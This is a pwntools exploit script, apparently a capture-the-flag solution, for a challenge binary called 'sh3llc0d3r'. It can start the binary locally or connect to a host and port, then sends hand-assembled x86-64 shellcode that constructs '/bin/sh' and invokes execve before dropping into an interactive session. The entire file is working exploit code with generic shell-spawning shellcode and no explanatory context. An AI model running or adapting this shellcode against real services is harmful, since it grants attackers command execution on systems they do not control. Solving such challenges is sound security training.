#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('../sh3llc0d3r')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 11665)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def reverse_bytes(a):
    b = ''
    for k in range(len(a) - 1, 0, -2):
        b += a[k - 1] + a[k]
    return b


def find_libc_addr(io):
    while True:
        line = io.recvline().decode('utf-8')
        if 'libc' in line:
            libc = int(line.split('-')[0], 16)
            break
    return libc


gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()

shellcode = b'H1\xf6H1\xd2H1\xdb\xb3g\xfe\xc3H\xc1\xe3\x08\xb3sH\xc1\xe3\x08\xb3/H\xc1\xe3\x08\xb3nH\xc1\xe3\x08\xb3iH\xc1\xe3\x08\xb3bH\xc1\xe3\x08\xb3/SH\x89\xd0\xb0;H\x89\xe7\x0f\x05'
io.sendline(shellcode)

io.interactive()